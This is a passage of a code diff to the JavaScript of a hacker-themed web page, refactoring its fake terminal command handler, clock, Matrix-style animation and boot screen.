+if(res)res.innerHTML=p||'<div style="color:var(--green)">[OK] Done</div>';
 if(btn){btn.disabled=false;btn.textContent='[>] EJECUTAR'}
 }
 }catch(err){
@@ -594,58 +668,42 @@ if(btn){btn.disabled=false;btn.textContent='[>] EJECUTAR'}
 }
 
 // ============ TERMINAL ============
-var terminalInput=document.getElementById('terminalInput');
-document.getElementById('tabBar').addEventListener('click',function(e){
-var tab=e.target.closest('.tab');
-if(!tab)return;
-currentTab=tab.dataset.tab;
-renderTools(currentTab);
-});
-
-terminalInput.addEventListener('keydown',function(e){
+document.getElementById('terminalInput').addEventListener('keydown',function(e){
 if(e.key!=='Enter')return;
-var cmd=terminalInput.value.trim();
-terminalInput.value='';
+var cmd=document.getElementById('terminalInput').value.trim();
+document.getElementById('terminalInput').value='';
 log('root@nexus:~$ '+cmd);
 if(cmd==='')return;
-var parts=cmd.split(' ');
-if(parts[0]==='help'){
-log('Commands: help, tools, clear, about, <toolname> [args]');
-log('Real API tools: '+ALL_TOOLS.filter(function(t){return t.real}).map(function(t){return t.cmd}).join(', '));
-}else if(parts[0]==='tools'){
-log('Available tools:');
-ALL_TOOLS.forEach(function(t){log((t.real?'[API]':'[SIM]')+' '+t.cmd+' - '+t.name)});
-}else if(parts[0]==='clear'){document.getElementById('terminalBody').innerHTML=''}
-else if(parts[0]==='about'){log('H4CK3R ZONE v5.0 ULTIMATE by Nexus Team')}
+var p=cmd.split(' ');
+if(p[0]==='help'){
+log('Commands: help, tools, clear, about, <toolname>');
+log('Tools: '+TOOLS.map(function(t){return t.cmd}).join(', '));
+}else if(p[0]==='tools'){
+log('Available tools ('+TOOLS.length+'):');
+TOOLS.forEach(function(t){log('['+(t.auth==='user'?'USER':'BOT')+'] '+t.cmd+' - '+t.name)});
+}else if(p[0]==='clear'){document.getElementById('terminalBody').innerHTML=''}
+else if(p[0]==='about'){log('H4CK3R ZONE v6.0 - 25 functional tools')}
 else{
-var found=ALL_TOOLS.find(function(t){return t.cmd===parts[0]});
+var found=TOOLS.find(function(t){return t.cmd===p[0]});
 if(found){
 if(found.fields&&found.fields.length){
-log('[!] Tool "'+parts[0]+'" needs fields. Use the panel.','warn');
-renderTools(currentTab);
-setTimeout(function(){
-var panel=document.getElementById('panel_'+parts[0]);
-if(panel)panel.scrollIntoView({behavior:'smooth',block:'center'});
-},100);
-}else{
-execTool(parts[0]);
-}
-}else{
-log('[ERROR] Unknown command: '+parts[0]+'. Type help','error');
-}
+log('[!] '+p[0]+' needs fields - use the panel above','warn');
+var pnl=document.getElementById('panel_'+p[0]);
+if(pnl)pnl.scrollIntoView({behavior:'smooth',block:'center'});
+}else exec(p[0]);
+}else log('[ERROR] Unknown: '+p[0]+'. Type help','error');
 }
 });
 
 function updateClock(){document.getElementById('clock').textContent=new Date().toLocaleTimeString('es-ES')}
-setInterval(updateClock,1000);updateClock();
-renderTools('real');
+setInterval(updateClock,1000);updateClock();render();
 
 // Matrix
 var c=document.getElementById('matrix'),ctx=c.getContext('2d');
-function resize(){c.width=window.innerWidth;c.height=window.innerHeight}
-resize();window.addEventListener('resize',resize);
+function rs(){c.width=window.innerWidth;c.height=window.innerHeight}
+rs();window.addEventListener('resize',rs);
 var cols=Math.floor(window.innerWidth/14),drops=Array(cols).fill(1);
-function draw(){
+function dr(){
 ctx.fillStyle='rgba(10,10,10,0.05)';ctx.fillRect(0,0,c.width,c.height);
 ctx.font='14px monospace';
 for(var i=0;i<drops.length;i++){
@@ -655,7 +713,7 @@ if(drops[i]*14>c.height&&Math.random()>0.975)drops[i]=0;
 drops[i]++;
 }
 }
-setInterval(draw,50);
+setInterval(dr,50);
 
 // Boot
 var bl=document.querySelectorAll('.boot-line'),bp=document.getElementById('bootProgress'),bs=document.getElementById('bootScreen'),mc=document.getElementById('mainContent'),bi=0;
